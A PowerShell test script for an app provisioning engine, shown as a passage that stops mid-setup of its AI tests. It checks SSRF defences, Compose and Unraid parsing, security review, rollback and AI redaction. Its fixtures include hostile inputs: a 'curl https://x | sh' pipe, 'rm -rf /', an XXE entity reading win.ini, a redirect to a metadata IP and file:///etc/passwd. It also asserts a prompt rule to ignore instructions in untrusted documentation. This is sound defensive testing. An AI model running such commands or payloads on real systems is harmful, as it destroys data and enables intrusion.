#requires -version 5.1
<#
.SYNOPSIS
  Universal provisioning engine: source import, normalized manifests, security review, host compatibility, the
  identity contract (with an in-memory authentik), AI assistance (mocked provider), community recipes, the web API on
  a throwaway instance and (unless -SkipDocker) one real, disposable two-service deployment with verification and
  rollback.

.DESCRIPTION
  Part 1 (no network, no Docker): URL safety (SSRF, private addresses, redirects, size), link classification, image
  references, Compose models (multi-service, shared secrets, unsafe directives), Unraid templates (ports, appdata,
  shares, PUID/PGID, masked variables, plugins, XXE), awesome-selfhosted entries, Docker Hub and GitHub imports through
  fixture responses, the security review and host compatibility, AI redaction / estimates / budgets / cache / merge
  rules, recipes (sanitizing, tamper detection, ranking) and the identity contract's pure decisions.
  Part 2 (in-memory authentik): the real Sync-AuthentikAppProtection and Remove-AuthentikAppProtection against a fake
  authentik API: preview, create, reuse, and rollback that deletes only what one operation created.
  Part 3 (Docker, no containers): Compose parsing with `docker compose config`, and the generated multi-service Compose
  project validated by Docker.
  Part 4 (throwaway instance, web API): refused imports, draft view, answering the web port, AI endpoints without any
  network call, plans that are blocked (findings, public without Cloudflare, authentik not ready) or ready.
  Part 5 (Docker, small, -SkipDocker skips it): an imported two-service app (local Traefik image, nothing downloaded)
  deployed on a LAN route, verified stage by stage, then rolled back with its data; every other container keeps its ID
  and start time.

.EXAMPLE
  powershell -ExecutionPolicy Bypass -File .\tests\Test-Provisioning.ps1 -SkipDocker
#>
[CmdletBinding()]
param([switch]$SkipDocker)

$ErrorActionPreference = 'Stop'
Set-StrictMode -Version 2.0
$repo = Split-Path -Parent (Split-Path -Parent $MyInvocation.MyCommand.Path)
foreach ($m in @('TraefikProxy', 'AppCatalog', 'SafeFetch', 'AppSources', 'HostPlatform', 'ProvisionPolicy', 'IdentityContract', 'AiAssist', 'Recipes', 'IdentityProvider', 'Authentik')) { Import-Module (Join-Path $repo "lib\$m.psm1") -Force }
Import-Module (Join-Path $repo 'tests\WebUiTestHelpers.psm1') -Force
$script:Results = New-Object System.Collections.ArrayList
function Add-Result([string]$Status, [string]$Name, [string]$Detail) {
  $null = $script:Results.Add([pscustomobject]@{ Status = $Status; Test = $Name; Detail = $Detail })
  $color = @{ PASS = 'Green'; FAIL = 'Red'; SKIP = 'DarkYellow' }[$Status]
  Write-Host ('[{0}] {1}  {2}' -f $Status, $Name, $Detail) -ForegroundColor $color
}
function Test-Condition([string]$Name, [bool]$Condition, [string]$Detail = '') { if ($Condition) { Add-Result 'PASS' $Name '' } else { Add-Result 'FAIL' $Name $Detail } }
function Test-Throws([string]$Name, [scriptblock]$Block, [string]$Pattern) { try { & $Block; Add-Result 'FAIL' $Name 'no error' } catch { Test-Condition $Name ($_.Exception.Message -match $Pattern) $_.Exception.Message } }
$digest = 'sha256:' + ('a' * 64)
$publicResolver = { param($h) @('93.184.216.34') }

# --- Part 1a: URL safety ---------------------------------------------------------------------------------------------------
$pub = @{ '8.8.8.8' = $true; '1.1.1.1' = $true; '10.0.0.1' = $false; '172.16.5.4' = $false; '172.32.0.1' = $true; '192.168.1.1' = $false; '127.0.0.1' = $false; '169.254.169.254' = $false; '100.64.0.1' = $false; '0.0.0.0' = $false; '224.0.0.1' = $false; '::1' = $false; 'fe80::1' = $false; 'fd00::1' = $false; '::ffff:10.0.0.1' = $false; '2606:4700::1111' = $true }
$bad = @($pub.Keys | Where-Object { (Test-PublicAddress $_) -ne $pub[$_] })
Test-Condition 'ssrf: public, private, loopback, link-local (cloud metadata), CGNAT, multicast and IPv4-mapped IPv6 addresses are classified correctly' (-not $bad.Count) ($bad -join ', ')
Set-SafeFetchResolver $publicResolver
$refused = @{ 'http://hub.docker.com/r/a/b' = 'https'; 'https://127.0.0.1/x' = 'IP addresses'; 'https://[::1]/x' = 'IP addresses'; 'https://user:pw@github.com/a/b' = 'user name'; 'https://github.com:8443/a' = 'port'; 'https://evil.example.com/x' = 'not a supported source'; 'https://github.com.evil.com/a' = 'not a supported source'; 'file:///etc/passwd' = 'https' }
$wrong = @($refused.Keys | Where-Object { $r = Test-ImportUrl $_; $r.Ok -or $r.Reason -notmatch $refused[$_] })
Test-Condition 'ssrf: http, IP literals, credentials in the URL, other ports, unlisted and look-alike hosts and file: URLs are refused' (-not $wrong.Count) ($wrong -join ', ')
Set-SafeFetchResolver { param($h) @('10.1.2.3') }
Test-Condition 'ssrf: an allowed host name that resolves to a private address (DNS rebinding) is refused' ((Test-ImportUrl 'https://github.com/a/b').Reason -match 'private or local') ''
Set-SafeFetchResolver $publicResolver
Set-SafeFetchHandler { param($u, $h) if ($u -like 'https://github.com/redirect*') { @{ Status = 302; Location = 'http://169.254.169.254/latest/meta-data/' } } else { @{ Status = 200; Body = ('x' * 3000) } } }
Test-Throws 'ssrf: a redirect to a metadata address is checked again and refused' { Invoke-SafeFetch -Url 'https://github.com/redirect' } 'https'
Test-Throws 'size: a response over the limit is refused' { Invoke-SafeFetch -Url 'https://github.com/big' -MaxBytes 1024 } 'larger than'
Set-SafeFetchHandler { param($u, $h) $script:SeenAuth = [string]$h['Authorization']; if ($u -like '*first*') { @{ Status = 307; Location = 'https://production.cloudfront.docker.com/blob' } } else { @{ Status = 200; Body = 'ok' } } }
$null = Invoke-SafeFetch -Url 'https://registry-1.docker.io/first' -Headers @{ Authorization = 'Bearer secret-token' }
Test-Condition 'redirects: a registry bearer token is never sent along a redirect to another host' ($script:SeenAuth -eq '') $script:SeenAuth

# --- Part 1b: links and images ---------------------------------------------------------------------------------------------
$kinds = [ordered]@{ 'https://hub.docker.com/r/louislam/uptime-kuma' = 'dockerhub'; 'https://hub.docker.com/_/nginx' = 'dockerhub'; 'https://github.com/immich-app/immich' = 'github-repo'
  'https://github.com/immich-app/immich/blob/main/docker/docker-compose.yml' = 'github-file'; 'https://raw.githubusercontent.com/linuxserver/templates/main/unraid/jellyfin.xml' = 'unraid-xml'
  'https://github.com/awesome-selfhosted/awesome-selfhosted-data/blob/master/software/uptime-kuma.yml' = 'directory'; 'ghcr.io/gethomepage/homepage:v1.0' = 'image'; 'nginx:1.27' = 'image'; 'https://ca.unraid.net/apps/plex' = 'unraid-ca'; 'not a link' = 'unknown' }
$wk = @($kinds.Keys | Where-Object { (Get-AppSourceKind $_).Kind -ne $kinds[$_] })
Test-Condition 'links: Docker Hub, GitHub repositories and files, Unraid XML, awesome-selfhosted entries, image names and Community Applications pages are recognized' (-not $wk.Count) ($wk -join ', ')
$r1 = ConvertTo-ImageReference 'nginx'; $r2 = ConvertTo-ImageReference "ghcr.io/owner/app:1.2@$digest"; $r3 = ConvertTo-ImageReference 'localhost:5000/x/y'
Test-Condition 'images: docker.io/library defaults, registries, tags and digests are parsed' ($r1.Registry -eq 'docker.io' -and $r1.Repository -eq 'library/nginx' -and $r1.Tag -eq 'latest' -and $r2.Registry -eq 'ghcr.io' -and $r2.Tag -eq '1.2' -and $r2.Digest -eq $digest -and $r3.Registry -eq 'localhost:5000') ''
$tags = @([pscustomobject]@{ name = 'latest'; digest = 'sha256:1' }, [pscustomobject]@{ name = '2.1.0'; digest = 'sha256:1' }, [pscustomobject]@{ name = '2.2.0-rc1'; digest = 'sha256:2' }, [pscustomobject]@{ name = '1.9'; digest = 'sha256:3' })
Test-Condition "tags: the stable version that 'latest' points to is chosen, never a release candidate" ((Select-ImageTag $tags).Name -eq '2.1.0' -and (Select-ImageTag @([pscustomobject]@{ name = 'latest'; digest = '' })).Name -eq 'latest') ''

# --- Part 1c: Compose models -----------------------------------------------------------------------------------------------
function New-Model($Services) { return (ConvertTo-PlainObject ([ordered]@{ services = $Services })) }
$model = New-Model ([ordered]@{
    web = [ordered]@{ image = 'ghcr.io/example/app:${APP_TAG:-1.4.0}'; ports = @([ordered]@{ target = 3000; published = '8080'; protocol = 'tcp' }); environment = [ordered]@{ DATABASE_URL = 'postgres://app:${DB_PASSWORD}@db/app'; REDIS_URL = 'redis://cache:6379'; ADMIN_EMAIL = '${ADMIN_EMAIL}' }
      depends_on = [ordered]@{ db = [ordered]@{ condition = 'service_healthy' }; migrate = [ordered]@{ condition = 'service_completed_successfully' } }; volumes = @([ordered]@{ type = 'bind'; source = './uploads'; target = '/app/uploads' }); labels = [ordered]@{ 'traefik.enable' = 'true' } }
    worker = [ordered]@{ image = 'ghcr.io/example/app:1.4.0'; command = @('node', 'worker.js'); environment = @('DB_PASSWORD=${DB_PASSWORD}') }
    migrate = [ordered]@{ image = 'ghcr.io/example/app:1.4.0'; command = @('node', 'migrate.js'); restart = 'no' }
    db = [ordered]@{ image = 'postgres:16-alpine'; environment = [ordered]@{ POSTGRES_PASSWORD = '${DB_PASSWORD}' }; healthcheck = [ordered]@{ test = @('CMD', 'pg_isready'); interval = '10s' }; volumes = @([ordered]@{ type = 'volume'; source = 'pgdata'; target = '/var/lib/postgresql/data' }); ports = @([ordered]@{ target = 5432; published = '5432'; protocol = 'tcp' }) }
    cache = [ordered]@{ image = 'valkey/valkey:8'; environment = [ordered]@{ VALKEY_PASSWORD = 'changeme' } }
  })
$c = ConvertFrom-ComposeModel -Model $model -EnvDefaults ([ordered]@{ ADMIN_EMAIL = '' })
$s = $c.Services
Test-Condition 'compose: the web service is the application with a published port, never the database that also publishes one' ($c.Web.service -eq 'web' -and @($s.web.ports | Where-Object { $_.Contains('primary') }).Count -eq 1 -and -not @($s.db.ports | Where-Object { $_.Contains('primary') }).Count) ($c.Web | ConvertTo-Json -Compress)
Test-Condition 'compose: roles from images and dependencies (database, cache, one-time migration job, worker)' ($s.db.role -eq 'database' -and $s.cache.role -eq 'cache' -and $s.migrate.role -eq 'init' -and $s.migrate.lifecycle -eq 'run-once' -and $s.worker.role -eq 'worker' -and $s.web.role -eq 'app') "$($s.db.role) $($s.cache.role) $($s.migrate.role) $($s.worker.role)"
$ids = @($c.Inputs | ForEach-Object { $_.id })
Test-Condition 'compose: one database password shared by web, worker and database (a generated secret, not the example)' (@($c.Inputs | Where-Object { $_.id -eq 'dbPassword' -and $_.type -eq 'generated' }).Count -eq 1 -and $s.db.environment.POSTGRES_PASSWORD -eq '{{input:dbPassword}}' -and $s.web.environment.DATABASE_URL -eq 'postgres://app:{{input:dbPassword}}@db/app' -and $s.worker.environment.DB_PASSWORD -eq '{{input:dbPassword}}') ($ids -join ',')
Test-Condition "compose: a literal example password ('changeme') is replaced by a generated secret" ($s.cache.environment.VALKEY_PASSWORD -like '{{input:*}}' -and @($c.Inputs | Where-Object { $_.type -eq 'generated' -and $_.label -eq 'VALKEY_PASSWORD' }).Count -eq 1) ($s.cache.environment | ConvertTo-Json -Compress)
Test-Condition 'compose: a required setting without default becomes a required question, not an invented value' (@($c.Inputs | Where-Object { $_.id -eq 'adminEmail' -and $_.required }).Count -eq 1 -and @($c.Unresolved | Where-Object { $_.field -eq 'inputs.adminEmail' }).Count -eq 1) ''
Test-Condition 'compose: image variables resolved from their defaults; project bind mounts become named volumes; Traefik labels are ignored (noted)' ($s.web.image -eq 'ghcr.io/example/app:1.4.0' -and @($s.web.volumes | Where-Object { $_.name -eq 'uploads' -and $_.kind -eq 'volume' }).Count -eq 1 -and @($c.Notes | Where-Object { $_ -match 'Traefik labels' }).Count -eq 1) ''
Test-Condition 'compose: ports other than the web port are never published (the database port is dropped)' (-not @($s.db.ports | Where-Object { $_.Contains('published') }).Count -and -not @($s.web.ports | Where-Object { $_.Contains('published') }).Count) ''
$unsafe = New-Model ([ordered]@{
    app = [ordered]@{ image = 'ex/app:1'; ports = @([ordered]@{ target = 80; published = '80'; protocol = 'tcp' }); privileged = $true; cap_add = @('NET_ADMIN'); volumes = @([ordered]@{ type = 'bind'; source = '/var/run/docker.sock'; target = '/var/run/docker.sock' }, [ordered]@{ type = 'bind'; source = '/etc'; target = '/host-etc' }, [ordered]@{ type = 'bind'; source = '/mnt/media'; target = '/media' }) }
    vpn = [ordered]@{ image = 'ex/vpn:1'; network_mode = 'service:app' }
    built = [ordered]@{ build = [ordered]@{ context = '.' } }
  })
$u = ConvertFrom-ComposeModel -Model $unsafe
$why = (@($u.Unsupported | ForEach-Object { $_.reason }) -join ' | ')
Test-Condition 'compose: cap_add, host system mounts, shared network namespaces and source builds are unsupported (reported, not imported)' ($why -match 'cap_add' -and $why -match "/etc" -and $why -match 'network_mode' -and $why -match 'built from source') $why
Test-Condition 'compose: privileged and Docker socket become declared privileges; other host folders become an optional folder choice' (@($u.Privileges | Where-Object { $_.kind -eq 'privileged' }).Count -and @($u.Privileges | Where-Object { $_.kind -eq 'docker-socket' }).Count -and @($u.Services.app.volumes | Where-Object { $_.target -eq '/media' -and $_.input }).Count -eq 1) ''

# --- Part 1d: Unraid templates, directories --------------------------------------------------------------------------------
$xml = @'
<?xml version="1.0"?>
<Container version="2">
  <Name>MediaThing</Name>
  <Repository>lscr.io/linuxserver/mediathing</Repository>
  <Network>br0</Network>
  <Privileged>false</Privileged>
  <Overview>A [b]media[/b] server.</Overview>
  <Project>https://github.com/example/mediathing</Project>
  <WebUI>http://[IP]:[PORT:8096]/web</WebUI>
  <ExtraParams>--cap-add=NET_ADMIN --restart unless-stopped</ExtraParams>
  <Category>MediaServer:Video</Category>
  <Config Name="Web" Target="8096" Default="8096" Mode="tcp" Type="Port">8096</Config>
  <Config Name="Discovery" Target="7359" Default="7359" Mode="udp" Type="Port">7359</Config>
  <Config Name="Config" Target="/config" Default="/mnt/user/appdata/mediathing" Mode="rw" Type="Path">/mnt/user/appdata/mediathing</Config>
  <Config Name="Movies" Target="/movies" Default="/mnt/user/media/movies" Mode="ro" Type="Path">/mnt/user/media/movies</Config>
  <Config Name="PUID" Target="PUID" Default="99" Type="Variable">99</Config>
  <Config Name="PGID" Target="PGID" Default="100" Type="Variable">100</Config>
  <Config Name="API key" Target="API_KEY" Default="" Mask="true" Type="Variable"></Config>
  <Config Name="GPU" Target="/dev/dri" Default="/dev/dri" Type="Device">/dev/dri</Config>
</Container>
'@
$t = ConvertFrom-UnraidTemplate $xml
$tc = ConvertFrom-ComposeModel -Model $t.Model -Origin 'Unraid template'
$ts = $tc.Services.mediathing
Test-Condition 'unraid: the WebUI port is the web interface; the UDP discovery port is kept but not published' ($tc.Web.service -eq 'mediathing' -and @($ts.ports | Where-Object { $_.container -eq 8096 -and $_.Contains('primary') }).Count -eq 1 -and @($ts.ports | Where-Object { $_.container -eq 7359 -and $_.protocol -eq 'udp' }).Count -eq 1) ($ts.ports | ConvertTo-Json -Compress)
Test-Condition 'unraid: appdata becomes a named volume; a media share becomes an optional folder choice' (@($ts.volumes | Where-Object { $_.target -eq '/config' -and -not $_.Contains('input') }).Count -eq 1 -and @($ts.volumes | Where-Object { $_.target -eq '/movies' -and $_.input -and $_.readOnly }).Count -eq 1) ($ts.volumes | ConvertTo-Json -Compress)
Test-Condition "unraid: PUID/PGID 99:100 (Unraid's nobody:users) are mapped to 1000; a masked variable becomes a generated secret" ($ts.environment.PUID -eq '1000' -and $ts.environment.PGID -eq '1000' -and $ts.environment.API_KEY -like '{{input:*}}' -and @($tc.Inputs | Where-Object { $_.label -eq 'API_KEY' -and $_.type -eq 'generated' }).Count -eq 1) ''
Test-Condition 'unraid: devices need a privilege; extra docker run arguments (cap-add) are unsupported; the custom network is explained' (@($tc.Privileges | Where-Object { $_.kind -eq 'device' }).Count -eq 1 -and @($tc.Unsupported | Where-Object { $_.reason -match 'cap_add' }).Count -eq 1 -and @($t.Notes | Where-Object { $_ -match "custom network 'br0'" }).Count -eq 1) ''
Test-Throws 'unraid: an OS plugin (.plg) is refused as not a Docker application' { ConvertFrom-UnraidTemplate '<?xml version="1.0"?><PLUGIN name="x"><PluginURL>https://x/y.plg</PluginURL></PLUGIN>' } 'plugin'
Test-Throws 'unraid: a template with a DOCTYPE (XML external entities) is refused' { ConvertFrom-UnraidTemplate '<?xml version="1.0"?><!DOCTYPE c [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><Container><Name>&x;</Name><Repository>a/b</Repository></Container>' } 'not valid or safe XML'
Test-Throws 'unraid: malformed XML is reported, not guessed' { ConvertFrom-UnraidTemplate '<Container><Name>x</Container>' } 'not valid'
$dy = ConvertFrom-DirectoryYaml "name: `"Uptime Kuma`"`nwebsite_url: https://uptime.kuma.pet`nsource_code_url: https://github.com/louislam/uptime-kuma`nlicenses:`n  - MIT`ntags:`n  - Monitoring`n"
Test-Condition 'directory: an awesome-selfhosted entry is read for attribution and its source repository' ($dy.name -eq 'Uptime Kuma' -and $dy.source_code_url -eq 'https://github.com/louislam/uptime-kuma' -and (@($dy.licenses) -join ',') -eq 'MIT') ''

# --- Part 1e: imports through fixture responses (no network) ---------------------------------------------------------------
$fx = @{}
$fx['https://hub.docker.com/v2/repositories/acme/tool/'] = @{ Body = (@{ name = 'tool'; description = 'A tool'; full_description = "# Tool`nRun it and set TOOL_SECRET." } | ConvertTo-Json) }
$fx['https://hub.docker.com/v2/repositories/acme/tool/tags/?page_size=50&ordering=last_updated'] = @{ Body = (@{ results = @(@{ name = 'latest'; digest = 'sha256:9' }, @{ name = '3.0.1'; digest = 'sha256:9' }) } | ConvertTo-Json -Depth 4) }
$fx['https://auth.docker.io/token?scope=repository:acme/tool:pull&service=registry.docker.io'] = @{ Body = '{"token":"t"}' }
$index = (@{ mediaType = 'application/vnd.oci.image.index.v1+json'; manifests = @(@{ digest = 'sha256:' + ('b' * 64); platform = @{ os = 'linux'; architecture = 'amd64' } }, @{ digest = 'sha256:' + ('c' * 64); platform = @{ os = 'linux'; architecture = 'arm64' } }) } | ConvertTo-Json -Depth 5)
$fx['https://registry-1.docker.io/v2/acme/tool/manifests/3.0.1'] = @{ Body = $index; Headers = @{ 'Docker-Content-Digest' = $digest } }
$fx["https://registry-1.docker.io/v2/acme/tool/manifests/sha256:$('b' * 64)"] = @{ Body = (@{ mediaType = 'application/vnd.oci.image.manifest.v1+json'; config = @{ digest = 'sha256:' + ('d' * 64) } } | ConvertTo-Json) }
$fx["https://registry-1.docker.io/v2/acme/tool/blobs/sha256:$('d' * 64)"] = @{ Body = (@{ os = 'linux'; architecture = 'amd64'; config = @{ Volumes = @{ '/data' = @{} }; Labels = @{ 'org.opencontainers.image.licenses' = 'Apache-2.0' } } } | ConvertTo-Json -Depth 5) }
Set-SafeFetchHandler { param($u, $h) $r = $fx[$u]; if ($r) { $r } else { @{ Status = 404; Body = '{}' } } }
$dh = Import-AppSource -Text 'https://hub.docker.com/r/acme/tool'
$dm = $dh.Manifest
Test-Condition 'docker hub: incomplete metadata (no exposed port) stays an open question instead of an invented port; the draft is not installable' ($dh.Kind -eq 'dockerhub' -and -not $dm.installable -and @($dm.draft.unresolved | Where-Object { $_.field -eq 'web.port' }).Count -eq 1) (($dm.draft.unresolved | ForEach-Object { $_.field }) -join ',')
Test-Condition 'docker hub: the stable tag is pinned to its digest; platforms, licence label and declared volume are recorded' ($dm.services.tool.image -eq "acme/tool:3.0.1@$digest" -and (@($dm.architectures) -join ',') -eq 'linux/amd64,linux/arm64' -and $dm.license -eq 'Apache-2.0' -and @($dm.services.tool.volumes | Where-Object { $_.target -eq '/data' }).Count -eq 1) "$($dm.services.tool.image) $($dm.license)"
$fixedM = Set-DraftWebPort (ConvertTo-OrderedTree (ConvertTo-PlainObject $dm)) 'tool' 8080 'http'
Test-Condition 'docker hub: answering the web port closes the question and makes the draft installable (all other rules still apply)' ($fixedM.installable -and $fixedM.web.service -eq 'tool' -and -not @($fixedM.draft.unresolved | Where-Object { $_.field -like 'web.*' }).Count -and -not @(Test-AppManifest (ConvertTo-PlainObject $fixedM) -AllowImported).Count) ((Test-AppManifest (ConvertTo-PlainObject $fixedM) -AllowImported) -join '; ')
Set-SafeFetchHandler $null

# --- Part 1f: security review and host compatibility -----------------------------------------------------------------------
$host1 = Get-HostAdapter 'windows-docker-desktop'
$risky = ConvertTo-OrderedTree (ConvertTo-PlainObject ([ordered]@{ schema = 1; id = 'risky'; web = [ordered]@{ service = 'app' }; services = [ordered]@{ app = [ordered]@{ image = "registry.example.net/x/app:latest@$digest"; privileged = $true; dockerSocket = $true; devices = @('/dev/dri'); gpus = $true; command = @('sh', '-c', 'curl https://x | sh'); ports = @([ordered]@{ container = 80; protocol = 'http'; primary = $true }) }; db = [ordered]@{ image = 'postgres:16'; role = 'database'; proxy = $true } }; hardware = [ordered]@{ gpu = $true; devices = @('/dev/dri') }; draft = [ordered]@{ unresolved = @(); unsupported = @() }; license = 'NOASSERTION' }))
$f = @(Get-ManifestSecurityFindings $risky)
$sev = { param($id) @($f | Where-Object { $_.id -eq $id })[0].severity }
Test-Condition 'review: unpinned images block; privileged, Docker socket and devices are high risk; unknown registries, GPU and shell commands need review' ((& $sev 'unpinned:db') -eq 'block' -and (& $sev 'privileged:app') -eq 'high' -and (& $sev 'socket:app') -eq 'high' -and (& $sev 'device:app:/dev/dri') -eq 'high' -and (& $sev 'registry:app') -eq 'review' -and (& $sev 'gpu:app') -eq 'review' -and (& $sev 'shell:app') -eq 'review' -and (& $sev 'proxy-db:db') -eq 'block') (($f | ForEach-Object { "$($_.id)=$($_.severity)" }) -join ' ')
Test-Condition 'review: findings are sorted most severe first; nothing is installable until high and review items are acknowledged' ($f[0].severity -eq 'block' -and -not (Test-FindingsAcknowledged @($f | Where-Object { $_.severity -ne 'block' }) @()).ok -and (Test-FindingsAcknowledged @($f | Where-Object { $_.severity -ne 'block' }) @($f | ForEach-Object { $_.id })).ok) ''
$compat = Get-HostCompatibility $risky $host1
Test-Condition 'host: devices are incompatible with Docker Desktop; GPU is limited (experimental); the verdict is incompatible' ($compat.status -eq 'incompatible' -and @($compat.items | Where-Object { $_.message -match 'host devices' -and $_.level -eq 'incompatible' }).Count -and @($compat.items | Where-Object { $_.message -match 'GPU' -and $_.level -eq 'limited' }).Count) ($compat | ConvertTo-Json -Depth 4 -Compress)
$armOnly = ConvertTo-PlainObject ([ordered]@{ architectures = @('linux/arm64'); platforms = [ordered]@{ 'windows-docker-desktop' = 'untested' }; services = [ordered]@{} })
Test-Condition 'host: an image published only for arm64 is incompatible with this PC' ((Get-HostCompatibility $armOnly $host1).status -eq 'incompatible') ''
Test-Condition 'host: only the Windows adapter is implemented and tested; the others are planned and untested' ((@(Get-HostAdapters | Where-Object { $_.tested }) | ForEach-Object { $_.id }) -join ',' -eq 'windows-docker-desktop' -and @(Get-HostAdapters | Where-Object { $_.status -eq 'planned' }).Count -eq 5 -and (Get-HostAdapter 'vps-headless').managementAccess -match 'Never an unauthenticated public port') ''

# --- Part 1g: identity contract (pure) ---------------------------------------------------------------------------------------
$ready = Get-IdentityReadiness @{ provider = 'authentik'; installFound = $true; running = $true; onProxyNetwork = $true; tokenOk = $true; outpost = $true; publicUrl = 'https://auth.example.com/'; ownersGroup = $true }
$notReady = Get-IdentityReadiness @{ provider = 'authentik'; installFound = $true; running = $true; onProxyNetwork = $false; tokenOk = $false; publicUrl = '' }
Test-Condition 'contract: readiness lists what is missing (network, token, public sign-in address) and is ready only when all is in place' ($ready.ready -and -not $notReady.ready -and (@($notReady.missing | ForEach-Object { $_.id }) -join ',') -eq 'network,token,public-url') (@($notReady.missing | ForEach-Object { $_.id }) -join ',')
$provs = @(Get-ContractProviders @(Get-IdentityProviders) $ready)
Test-Condition 'contract: authentik can protect applications; Authelia is reported as install-only, not as a working option' (@($provs | Where-Object { $_.id -eq 'authentik' -and $_.canProtectApplications -and $_.ready }).Count -eq 1 -and @($provs | Where-Object { $_.id -eq 'authelia' -and -not $_.canProtectApplications }).Count -eq 1) ''
$jf = Get-ProtectionCompatibility ([ordered]@{ id = 'jellyfin'; name = 'Jellyfin'; services = [ordered]@{} })
$oidc = Get-ProtectionCompatibility ([ordered]@{ id = 'paperless'; name = 'Paperless'; services = [ordered]@{ web = [ordered]@{ environment = [ordered]@{ PAPERLESS_SOCIALACCOUNT_PROVIDERS = 'x'; OIDC_CLIENT_ID = '' } } } })
$plain = Get-ProtectionCompatibility ([ordered]@{ id = 'uptime-kuma'; name = 'Uptime Kuma'; services = [ordered]@{} })
Test-Condition 'contract: ForwardAuth is flagged for apps with their own clients (Jellyfin), native OIDC is recognized, plain web apps are compatible' ($jf.forwardAuth -eq 'caution' -and $oidc.nativeOidc -and $plain.forwardAuth -eq 'compatible' -and -not $plain.nativeOidc) ''
$opts = @(Get-ProvisionAuthOptions 'public' $ready $true $plain)
$optsLocal = @(Get-ProvisionAuthOptions 'local' $ready $true $plain)
Test-Condition "contract: public apps cannot be 'no sign-in'; their own login needs an acknowledgement; authentik needs a route; Authelia is never available" (-not @($opts | Where-Object { $_.id -eq 'none' })[0].available -and @($opts | Where-Object { $_.id -eq 'native' })[0].requiresAck -and @($opts | Where-Object { $_.id -eq 'authentik' })[0].available -and -not @($optsLocal | Where-Object { $_.id -eq 'authentik' })[0].available -and -not @($opts | Where-Object { $_.id -eq 'authelia' })[0].available) ''
$jr = New-ProvisionJournal 'abcdef12' 'test'
Add-JournalResource $jr 'compose-project' 'app' 'created'; Add-JournalResource $jr 'data-volume' 'app_data' 'created'; Add-JournalResource $jr 'traefik-route' 'app' 'created'
Add-JournalResource $jr 'authentik-application' 'dm-app' 'reused'; Add-JournalResource $jr 'authentik-outpost' 'embedded outpost' 'shared'; Add-JournalResource $jr 'cloudflare-dns' 'app.example.com' 'created'
$rb = Get-ProvisionRollbackPlan $jr
$rbData = Get-ProvisionRollbackPlan $jr -DeleteData
Test-Condition 'contract: rollback removes only created resources (newest first), keeps reused and shared ones and keeps data unless asked' ((@($rb.steps | ForEach-Object { $_.kind }) -join ',') -eq 'cloudflare-dns,traefik-route,compose-project' -and @($rb.kept | Where-Object { $_.kind -eq 'authentik-application' -and $_.why -match 'existed before' }).Count -and @($rb.kept | Where-Object { $_.kind -eq 'authentik-outpost' -and $_.why -match 'shared' }).Count -and @($rb.kept | Where-Object { $_.kind -eq 'data-volume' }).Count -and @($rbData.steps | Where-Object { $_.kind -eq 'data-volume' }).Count) (@($rb.steps | ForEach-Object { $_.kind }) -join ',')

# --- Part 1h: AI assistance (mocked provider; nothing leaves this PC) -------------------------------------------------------
$red = Protect-AiText "DB_PASSWORD=hunter2hunter2 mail owner@example.com ip 192.168.1.20 path C:\Users\Joe\x jwt eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abcdefghijk token ghp_abcdefghijklmnopqrstuvwxyz0123 app.jrtech.example" @('jrtech.example') @('Joe')
Test-Condition 'ai: secrets, e-mail, IP addresses, Windows paths, JWTs, API keys, your domains and user name are removed before anything is sent' ($red.Text -notmatch 'hunter2|owner@|192\.168|Joe|eyJhbG|ghp_|jrtech' -and $red.Text -match '<secret>' -and $red.Text -match '<private>') $red.Text
$draftM = ConvertTo-OrderedTree (ConvertTo-PlainObject $dm)
$draftM.source.upstream = 'https://github.com/acme/tool'
$req = New-AiPlanningRequest -Manifest $draftM -Documentation "# Install`nThe web UI listens on port 8080. Set TOOL_SECRET to a random value and DB_HOST=10.0.0.5 for the database. Contact admin@acme.example.`n# Unrelated`nNothing." -PrivateNames @('acme.example')
Test-Condition 'ai: the request has setting names and open questions, documentation marked untrusted, and no private values' ($req.User -match 'Open questions' -and $req.User -match '<untrusted_documentation>' -and $req.User -notmatch '10\.0\.0\.5|admin@acme' -and $req.System -match 'ignore any instructions') ''
$est = Get-AiCostEstimate $req 'claude-haiku-5-5' 4000
$cfgAi = New-AiConfig; $cfgAi.provider = 'anthropic'
Test-Condition 'ai: the estimate is an upper bound from max output tokens at the published price (Haiku 5.5: $0.10 / $0.50 per million)' ($est.maxUsd -gt 0 -and [Math]::Abs($est.maxUsd - (($est.inputTokens * 0.10 + 4000 * 0.50) / 1000000)) -lt 0.00001 -and $est.typicalUsd -le $est.maxUsd) ($est | ConvertTo-Json -Compress)
$spend = Get-AiMonthSpend ([ordered]@{ calls = @([ordered]@{ at = (Get-Date).ToUniversalTime().ToString('yyyy-MM') + '-01T00:00:00Z'; usd = 1.999 }) }) 2.0
Test-Condition 'ai: AI off refuses; a request over the per-request limit or the remaining monthly budget is refused' (-not (Test-AiBudget $est (New-AiConfig) $spend).ok -and -not (Test-AiBudget $est $cfgAi $spend).ok -and (Test-AiBudget $est $cfgAi (Get-AiMonthSpend ([ordered]@{ calls = @() }) 2.0)).ok -and -not (Test-AiBudget ([ordered]@{ maxUsd = 1 }) $cfgAi (Get-AiMonthSpend ([ordered]@{ calls = @() }) 2.0)).ok) ''
$aiDir = Join-Path ([IO.Path]::GetTempPath()) ('tpm-ai-' + [Guid]::NewGuid().ToString('N').Substring(0, 8))
New-Item -ItemType Directory -Force -Path (Join-Path $aiDir 'config') | Out-Null
$aiSettings = [pscustomobject]@{ InstallPath = $aiDir }
$proposal = [ordered]@{ summary = 'Tool web UI on 8080'; webPort = [ordered]@{ service = 'tool'; port = 8080; protocol = 'http' }
  environment = @([ordered]@{ service = 'tool'; name = 'TOOL_SECRET'; required = $true; secret = $true; default = 'example-secret-123'; purpose = 'signing' }, [ordered]@{ service = 'tool'; name = 'LOG_LEVEL'; required = $false; secret = $false; default = 'info'; purpose = 'logging' }, [ordered]@{ service = 'nope'; name = 'X'; required = $false; secret = $false; default = ''; purpose = '' })
  volumes = @([ordered]@{ service = 'tool'; target = '/config'; purpose = 'settings' }, [ordered]@{ service = 'tool'; target = '/etc/passwd'; purpose = 'bad' })
  dependencies = @([ordered]@{ kind = 'postgres'; image = 'postgres:16'; reason = 'database' })
  assumptions = @('Port 8080 is HTTP'); uncertainties = @('Whether a database is mandatory'); evidence = @([ordered]@{ claim = 'web port 8080'; quote = 'The web UI listens on port 8080.' }); nativeOidc = $false
  command = @('sh', '-c', 'rm -rf /'); privileged = $true }
$script:AiCalls = 0
